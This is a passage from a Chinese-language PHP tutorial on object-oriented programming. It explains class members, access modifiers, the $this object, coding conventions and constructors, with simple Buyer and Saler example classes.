class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义买家类：买家有姓名，有钱</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Buyer</span></span>&#123;</span><br><span class="line">    <span class="comment"># 属性声明</span></span><br><span class="line"><span class="variable">$name</span>;<span class="comment"># 错误，类内部属性必须使用访问修饰限定符</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;<span class="comment"># 正确：没有赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$money</span> = <span class="number">0</span>;<span class="comment"># 正确：有赋值</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 方法声明</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;<span class="comment"># 魔术常量，输出类名</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 类常量声明</span></span><br><span class="line">    <span class="keyword">const</span> BIG_NAME = <span class="string">&#x27;BUYER&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、成员变量访问（属性和方法）：成员必须通过对象才能进行访问，需要先通过实例化得到对象，然后通过对象实现对成员进行操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实例化对象</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Buyer();</span><br><span class="line"><span class="comment"># 访问属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>-&gt;money;</span><br><span class="line"><span class="comment"># 修改属性</span></span><br><span class="line"><span class="variable">$b</span>-&gt;money = <span class="number">1000</span>;</span><br><span class="line"><span class="comment"># 删除属性</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$b</span>-&gt;name);</span><br><span class="line"><span class="comment"># 新增属性</span></span><br><span class="line"><span class="variable">$b</span>-&gt;age = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问方法</span></span><br><span class="line"><span class="variable">$b</span>-&gt;display();</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><ul><li><p>删除属性和新增属性通常使用较少，更多的属性操作是访问和修改</p></li><li><p>类常量不是由对象来进行访问，所以暂时不做访问讲解，到后面知识再讲</p></li><li><p>属性和方法的使用都必须确保类中已经定义（属性可以新增）</p></li></ul><p>3、类成员中：属性、类常量和方法都可以无限定义，但是定义的原则是相关性。除了以上三个类成员，不能在类结构{}中直接写其他任何代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Buyer</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;<span class="comment"># 错误</span></span><br><span class="line">    define(<span class="string">&#x27;PI&#x27;</span>,<span class="number">3.14</span>); <span class="comment"># 错误</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>)&#123; <span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>&#125;<span class="comment"># 错误</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><blockquote><p><strong>小结</strong></p></blockquote><p>1、PHP类结构中有且仅有三种成员：属性、方法和类常量，其他直接属于类的内容都会报错</p><p>2、类声明需要根据业务来确定类成员的存在和数量</p><p>3、类中属性和方法的访问方式都是通过对象来调用：$对象-&gt;属性名/方法名()；注意属性名不带$符号</p><p>4、类中定义属性不能直接属性名，需要使用符号public修饰（访问修饰限定符中的一种）</p><h3 id="4、访问修饰限定符"><a href="#4、访问修饰限定符" class="headerlink" title="4、访问修饰限定符"></a><strong>4、访问修饰限定符</strong></h3><blockquote><p>目标：理解访问修饰限定符的作用，掌握访问修饰限定符的实际运用</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>访问修饰限定符</strong>：用在属性或者方法前的修饰关键字，是用来控制属性或者方法的访问位置</p><ul><li>访问修饰限定符分类<ul><li>public：公有，类内和类外都可以访问</li><li>protected：受保护，只允许在相关类内部访问</li><li>private：私有，只允许在定义类内部访问</li></ul></li><li>属性必须有访问修饰限定符，方法可以没有访问修饰限定符（默认public）</li></ul><blockquote><p>步骤</p></blockquote><p>1、声明类结构</p><p>2、确定类成员</p><p>3、确定类成员的访问位置限定，使用对应访问修饰限定符</p><p>4、只能在对应位置访问被修饰的成员</p><blockquote><p>示例</p></blockquote><p>1、公有成员访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="comment"># 属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">100</span>;</span><br><span class="line">    <span class="comment"># 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCount</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>;<span class="comment"># 魔术常量，显示当前方法名（包含类名）</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setCount</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化对象</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问（类外）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>-&gt;count;</span><br><span class="line"><span class="variable">$s</span>-&gt;getCount();</span><br><span class="line"><span class="variable">$s</span>-&gt;setCount();</span><br></pre></td></tr></table></figure><p>2、受保护和私有成员设定（当前受保护和私有一致，需要高阶知识才会有区别）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Buyer</span></span>&#123;</span><br><span class="line">    <span class="comment"># 属性</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$money</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$account</span> = <span class="string">&#x27;6226000000000001&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 方法</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getMoney</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getAccount</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Buyer();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>-&gt;money;<span class="comment"># 错误：当前属于类外部，不能访问</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>-&gt;account;<span class="comment"># 错误：当前属于类外部，不能访问</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;getMoney();<span class="comment"># 错误：当前属于类外部，不能访问</span></span><br><span class="line"><span class="variable">$b</span>-&gt;getAccount();<span class="comment"># 错误：当前属于类外部，不能访问</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><p>1、访问修饰限定符分为三种：public、protected和private，访问权限依次降低（类对成员控制权限依次增加）</p><p>2、访问修饰限定符限定的是成员到底在哪里能被访问，私有和受保护都只能在类内部访问，公有可以在任何地方访问（但都必须是对象去访问）</p><p>3、属性必须写清楚访问修饰限定符，方法可以省去（不建议），因为系统默认是public</p><h3 id="5、类内部对象"><a href="#5、类内部对象" class="headerlink" title="5、类内部对象"></a><strong>5、类内部对象</strong></h3><blockquote><p>目标：理解内部对象的概念，掌握内部对象对成员的访问</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>内部对象</strong>：$this，<strong>方法内部</strong>内置的一个对象，会自动指向来调用方法的对象</p><ul><li>$this存在于方法内部（仅限内部使用），所以相当于在类的结构内部<ul><li>可以访问任意访问修饰限定符修饰的成员</li><li>私有成员都是通过公有方法来实现访问（公有方法可以在类外部访问）</li></ul></li><li>类内部对类成员的访问也需要通过对象才能访问，所以必须通过$this内部对象访问类成员</li></ul><blockquote><p>步骤</p></blockquote><p>1、声明类结构</p><p>2、明确私有成员（不限定成员的访问修饰限定符）</p><p>3、私有成员需要在某种情况下被访问：增加方法，在方法里使用$this访问</p><blockquote><p>示例</p></blockquote><p>1、尝试在类内部方法中访问属性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$discount</span> = <span class="number">0.8</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$count</span>,<span class="variable">$discount</span>,<span class="variable">$money</span>;<span class="comment"># 全部错误：提示未定义的“变量”</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;getAll();</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：方法本质是定义在类内部的函数，因此受制于作用域的问题，在方法内部访问的变量系统认定为局部变量（必须内部定义或者参数传入），否则就会提示未定义</p><p>2、类内部访问类成员，需要通过对象来进行访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$discount</span> = <span class="number">0.8</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment"># 需要获取到对象名字：因为方法本身就是函数，访问外部全局变量可以通过global引入实现</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>-&gt;count,<span class="variable">$s</span>-&gt;discount,<span class="variable">$s</span>-&gt;money;<span class="comment">#正确输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;getAll();</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：上述代码规定死了以后对象只能是$s，不能有其他对象或者其他命名，所以非常不友好</p><p>3、使用内置对象$this访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$discount</span> = <span class="number">0.8</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;count,<span class="keyword">$this</span>-&gt;discount,<span class="keyword">$this</span>-&gt;money;<span class="comment">#正确输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;getAll();</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：$this代表的是对象，而​$this所在环境为类内部的方法内部，所以$this对象是在类内部访问，因此可以访问所有的属性和方法，不受访问修饰限定符限制</p><blockquote><p> $this、class和new之间的关系原理</p></blockquote><ul><li><p>class是定义类结构，属于非执行段代码，因此会被加载到代码段（编译阶段）</p></li><li><p>new是实例化对象，先判定类在内存（代码段）是否存在</p><ul><li>类不存在，报错；</li><li>类存在，将类内部的属性部分复制一份，然后在内存（堆区）开辟一块内存空间，将属性放到里面，同时内部有一个<strong>指针</strong>指向类的内存空间（代码段）</li><li>对象访问属性即访问的是对象空间里存储的部分</li><li>对象访问方法是对象通过<strong>内部指针</strong>找到类空间中的方法，然后在内存（栈区）开辟运行</li></ul></li><li><p>$this是系统在方法内置的对象通用名字</p><ul><li>对象在调用方法的时候，系统会自动找到对象所保存的内存地址（堆区），然后把地址赋值给$this</li></ul></li><li><p>方法内部的$this就代表调用当前$this所在方法的外部对象</p><ul><li>$this的本质是函数内部的一个局部变量，只是系统自动对其进行赋值，而且一定是调用方法的对象本身</li></ul></li><li><p>面向对象编程代码运行内存关系</p></li></ul><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/%E6%95%88%E6%9E%9C%E5%9B%BE/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E5%86%85%E5%AD%98%E5%85%B3%E7%B3%BB.gif" alt="面向对象编程代码运行内存关系"></p><blockquote><p><strong>小结</strong></p></blockquote><p>1、类内部方法内有一个内置对象$this，代表访问该方法的外部对象</p><p>2、类在实例化对象的时候要保证内存中有该类</p><p>3、一个类可以实例化多个对象，每个对象访问成员方法时，$this就代表对应对象</p><h3 id="6、面向对象开发规范"><a href="#6、面向对象开发规范" class="headerlink" title="6、面向对象开发规范"></a><strong>6、面向对象开发规范</strong></h3><blockquote><p>目标：了解面向对象的基本开发规范，熟练运用开发规范实现项目开发</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>开发规范</strong>：开发者约定俗成的开发设计方式</p><ul><li>属性的初始化<ul><li>属性是类对于同类事务所抽离出来的共性<code>数据</code>，本身在类结构中没有价值，是当具体对象产生之后，属于对象本身的</li><li>进行类中定义属性的时候，通常不会对属性进行初始化，除非属性本身的值也具有共性</li><li>属性如果没有初始化数据，那么在产生对象后应该对属性完成初始化（有的属性是在操作过程中被初始化）</li></ul></li><li>访问修饰限定符选择：访问修饰限定符是用来限制类成员被对象访问时对象所处位置的。访问的权限从public、protected到private依次变小（类对成员的控制权限依次变大）<ul><li>设定好的类成员本身不会被外部用到，那么应该使用private或者protected</li><li>设定好的类成员一定会给外部访问，使用public</li><li>属性通常private居多，如果需要外部访问属性，通常会定义相关方法来实现属性的查看和修改，因为可以在方法内对数据逻辑进行代码控制，安全</li><li>尽可能增加类对成员的控制（尽可能多使用private，少使用public）</li></ul></li></ul><blockquote><p>示例</p></blockquote><p>1、属性初始化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">    <span class="comment"># 某个卖家拥有的商品数量，每位具体卖家对象拥有的不可能一样，所以没必要初始化</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$discount</span>;</span><br><span class="line">    <span class="comment"># 某个卖家针对销售的折扣，同样没有统一的价值</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="comment"># 某个卖家的账户余额，任何一位卖家一开始做生意的时候，账户余额都为0，所以可以初始化</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 业务初始化属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setDiscount</span>(<span class="params"><span class="variable">$discount</span> = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment"># 可以进行逻辑控制</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;discount = <span class="variable">$discount</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化对象，初始化属性</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;count = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打折促销：业务初始化</span></span><br><span class="line"><span class="variable">$s</span>-&gt;setDiscount(<span class="number">0.8</span>);</span><br></pre></td></tr></table></figure><p>2、访问修饰限定符选择</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 增加方法操作私有属性money</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getMoney</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;money;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setMoney</span>(<span class="params"><span class="variable">$money</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment"># 可以对逻辑进行修改，对数据进行安全判定，保证数据的安全性</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;money = <span class="variable">$money</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;money是属性，$money是外部传入的参数，二者同名但是性质完全不同</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><blockquote><p><strong>小结</strong></p></blockquote><p>1、属性在类中定义的时候，通常不会初始化值，除非所有类实例化得到的对象的某个属性需要是统一值</p><p>2、应该尽可能增加类对成员的控制，即使用范围较小的访问修饰限定符优先</p><p>3、属性通常是私有化的，一般是通过设定方法来实现属性的访问和修改</p><h3 id="7、构造方法"><a href="#7、构造方法" class="headerlink" title="7、构造方法"></a><strong>7、构造方法</strong></h3><blockquote><p>目标：了解<strong>魔术方法</strong>的概念，掌握构造方法的作用，明确构造方法的触发模式</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>构造方法</strong>：__construct()，是一种类结构特有的特殊方法，该方法由系统规定好，开发人员在定义的时候只需要<strong>抄</strong>一遍，有了构造方法的类在实例化对象之后，对象就会自动调用。</p><ul><li>构造方法是一种魔术方法：<strong>魔术方法</strong>是会自动被触发，不需要手动调用的方法</li><li>构造方法的目标是为了实现对象的初始化<ul><li>对象实例化之后会自动调用</li><li>构造方法通常是为了实现对象所需资源的初始化（属性、资源）</li></ul></li><li>构造方法虽然为魔术方法，但本质依然是一个方法<ul><li>受访问修饰限定符控制（对象的产生位置会发生改变）</li><li>对象可以选择调用（一般不会）</li></ul></li><li>构造方法可以设定形参，形参对应的实参是在实例化对象的时候传入：new 类名(实参传递给形参)</li></ul><blockquote><p>步骤</p></blockquote><p>1、确定类中需要有数据实现初始化，而且是灵活处理，每个对象都不一样的：使用构造方法</p><p>2、确定初始化的数据需要外部传入：使用构造方法设定形参</p><p>3、在构造方法内部利用内部对象实现初始化需求</p><ul><li>属性初始化</li><li>资源初始化</li><li>其他内置方法调用</li></ul><p>4、实例化对象时必须传入构造方法所需数据</p><blockquote><p>示例</p></blockquote><p>1、构造方法实现：在类中增加一个方法__construct()即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="comment"># 构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、构造方法也是一个方法，不普通的地方在于，类实例化得到的对象会马上自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实例化</span></span><br><span class="line"><span class="keyword">new</span> Saler();<span class="comment"># 输出Saler</span></span><br></pre></td></tr></table></figure><p>3、构造方法的意义：构造方法是对象实例化的时候用来初始化对象的资源的，所以通常是用来初始化对象的属性或者其他资源初始化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造方法：初始化属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;count = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;money = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、如果属性的数据在构造方法中初始化是固定写死的，那么与直接在定义类的时候初始化属性一样。意味着数据没有任何价值（所有对象都相同），因此通常是通过构造方法的参数来实现数据的外部传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造方法：初始化属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$count</span>,<span class="variable">$money</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;count = <span class="variable">$count</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;money = <span class="variable">$money</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、一旦构造方法拥有了形参，那么对象在调用该方法的时候就需要传入对应的实参，而构造方法又是自动调用的，所以需要在实例化对象的时候使用new 类名(构造方法对应的实参列表)来实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实例化对象</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler(<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">new</span> Saler(<span class="number">1000</span>,<span class="number">1000</span>);</span><br><span class="line"><span class="variable">$s3</span> = <span class="keyword">new</span> Saler;<span class="comment"># 错误：因为此时类有构造方法且要求传入参数，所以必须使用（）并传入数据</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：之前所说的<code>new 类名</code> 和<code>new 类名()</code>没有区别是因为没有构造方法，或者构造方法没有参数限定，一旦构造方法有了参数，那么<code>new 类名</code> 就不能直接使用了。</p><p>6、构造方法不管再怎么特殊，也是用户定义的方法，言外之意除了在实例化对象时对象会自动调用之外，我们也可以手动调用构造方法（但是一般没有价值，因为对象实例化时会自动调用）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造方法：初始化属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$count</span>,<span class="variable">$money</span></span>)</span>&#123;</span><br><span class="line">        